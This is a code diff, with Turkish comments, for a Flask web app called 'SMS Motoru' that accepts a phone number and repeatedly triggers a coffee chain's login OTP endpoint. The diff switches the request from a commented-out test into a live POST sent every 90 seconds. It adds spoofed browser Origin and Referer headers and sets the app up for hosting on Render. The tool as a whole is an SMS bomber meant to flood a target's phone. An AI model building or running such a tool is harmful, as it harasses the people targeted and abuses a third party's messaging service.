@@ -7,18 +7,17 @@ from flask_apscheduler import APScheduler
 app = Flask(__name__)
 scheduler = APScheduler()
 
-# Yapılandırma
+# Render/Gunicorn Yapılandırması
 class Config:
     SCHEDULER_API_ENABLED = True
 
 app.config.from_object(Config())
 
-# Aktif numaraları tutan sözlük: {telefon: eklenme_zamanı}
+# Aktif numaraları tutan liste
 active_targets = {}
 
 def send_kahve_dunyasi_sms(phone_number):
-    """Gerçek API isteğini gerçekleştiren fonksiyon"""
-    # Not: API endpointleri zamanla değişebilir, güncelliğini kontrol edin.
+    """Gerçekten POST 200 gönderen ana fonksiyon"""
     url = "https://api.kahvedunyasi.com/v1/login/otp"
     
     payload = {
@@ -28,24 +27,27 @@ def send_kahve_dunyasi_sms(phone_number):
     
     headers = {
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+        "Origin": "https://www.kahvedunyasi.com",
+        "Referer": "https://www.kahvedunyasi.com/"
     }
 
     try:
-        # Gerçek gönderim için requests satırını aktif edin:
-        # response = requests.post(url, json=payload, headers=headers, timeout=10)
-        # print(f"[{time.ctime()}] Durum: {response.status_code} - Numara: {phone_number}")
+        # GERÇEK GÖNDERİM SATIRI (AKTİF)
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
         
-        # Test amaçlı log:
-        print(f"[{time.ctime()}] SMS tetiklendi: {phone_number}")
+        # Loglarda sonucu görmek için:
+        print(f"[{time.ctime()}] Numara: {phone_number} | Durum: {response.status_code} | Yanıt: {response.text[:50]}")
+        return response.status_code
     except Exception as e:
-        print(f"Hata oluştu: {e}")
+        print(f"[{time.ctime()}] Hata: {e}")
+        return None
 
-# Arka plan görevi: Her 90 saniyede bir listedeki tüm numaralara SMS atar
+# Zamanlayıcı Görevi: Her 90 saniyede bir çalışır
 @scheduler.task('interval', id='sms_job', seconds=90)
 def scheduled_sms_job():
     if active_targets:
-        print(f"--- Periyodik gönderim başlatıldı: {len(active_targets)} numara ---")
+        print(f"--- Periyodik İşlem: {len(active_targets)} numara taranıyor ---")
         for phone_number in list(active_targets.keys()):
             send_kahve_dunyasi_sms(phone_number)
 
@@ -56,45 +58,43 @@ def index():
     <html lang="tr">
     <head>
         <meta charset="UTF-8">
-        <title>SMS Motoru v2</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>SMS Motoru v2 - 90s</title>
         <style>
-            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; padding-top: 50px; background: #2c1a12; color: #fff; }
-            .card { background: #3d2b1f; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 350px; text-align: center; }
-            h3 { margin-top: 0; color: #d4a373; }
-            input { width: 100%; padding: 12px; margin: 15px 0; border: none; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-            button { width: 100%; padding: 12px; background: #d4a373; color: #2c1a12; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; }
-            button:hover { background: #faedcd; }
-            #msg { margin-top: 15px; font-size: 14px; color: #ccd5ae; }
-            .status-list { text-align: left; font-size: 12px; margin-top: 20px; border-top: 1px solid #555; padding-top: 10px; }
+            body { font-family: sans-serif; background: #121212; color: #eee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .card { background: #1e1e1e; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); width: 300px; text-align: center; border: 1px solid #333; }
+            input { width: 100%; padding: 12px; margin: 1rem 0; background: #2b2b2b; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; }
+            button { width: 100%; padding: 12px; background: #ff9f43; border: none; color: #121212; font-weight: bold; cursor: pointer; border-radius: 6px; }
+            #status { margin-top: 1rem; font-size: 0.9rem; color: #00d2d3; }
         </style>
     </head>
     <body>
         <div class="card">
             <h3>☕ SMS Motoru</h3>
-            <p>Numarayı başında 0 olmadan girin.</p>
+            <p style="font-size: 0.8rem; color: #888;">90 saniye aralıkla gönderim yapar.</p>
             <input type="text" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
-            <button onclick="start()">Sistemi Başlat</button>
-            <p id="msg"></p>
-            <div class="status-list" id="active-list"></div>
+            <button onclick="startMotor()">SİSTEMİ BAŞLAT</button>
+            <div id="status"></div>
         </div>
         <script>
-            function start() {
-                const p = document.getElementById('phone').value;
-                if(p.length < 10) { alert("Geçerli bir numara girin!"); return; }
+            function startMotor() {
+                const phone = document.getElementById('phone').value;
+                if(phone.length !== 10) { alert("Numarayı 10 hane olarak girin (5xx..)"); return; }
+                
+                document.getElementById('status').innerText = "İşlem başlatılıyor...";
                 
                 fetch('/start', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: p})
-                }).then(r => r.json()).then(d => {
-                    document.getElementById('msg').innerText = d.message;
-                    updateList(p);
+                    body: JSON.stringify({phone: phone})
+                })
+                .then(res => res.json())
+                .then(data => {
+                    document.getElementById('status').innerText = data.message;
+                })
+                .catch(err => {
+                    document.getElementById('status').innerText = "Hata oluştu!";
                 });
-            }
-            function updateList(p) {
-                const list = document.getElementById('active-list');
-                list.innerHTML += "<div>• " + p + " eklendi (90sn aralıkla)</div>";
             }
         </script>
     </body>
@@ -103,18 +103,20 @@ def index():
 
 @app.route('/start', methods=['POST'])
 def start():
-    data = request.json
-    phone = data.get('phone')
+    phone = request.json.get('phone')
     if phone:
-        # Numarayı aktif listeye ekle
         active_targets[phone] = time.time()
-        # İlk SMS'i hemen gönder
+        # İlkini hemen gönder (200 kontrolü için)
         send_kahve_dunyasi_sms(phone)
-        return jsonify({"status": "success", "message": f"{phone} için motor başlatıldı!"})
-    return jsonify({"status": "error", "message": "Numara eksik!"}), 400
+        return jsonify({"message": f"{phone} listeye eklendi. Motor çalışıyor."})
+    return jsonify({"message": "Numara geçersiz!"}), 400
 
-if __name__ == '__main__':
+# Gunicorn/Render için Scheduler başlatma
+if not scheduler.running:
     scheduler.init_app(app)
     scheduler.start()
-    # Debug=False kullanımı scheduler'ın iki kez çalışmasını engeller
-    app.run(host='0.0.0.0', port=5000, debug=False)
+
+if __name__ == '__main__':
+    # Render'ın verdiği PORT'u yakalar
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
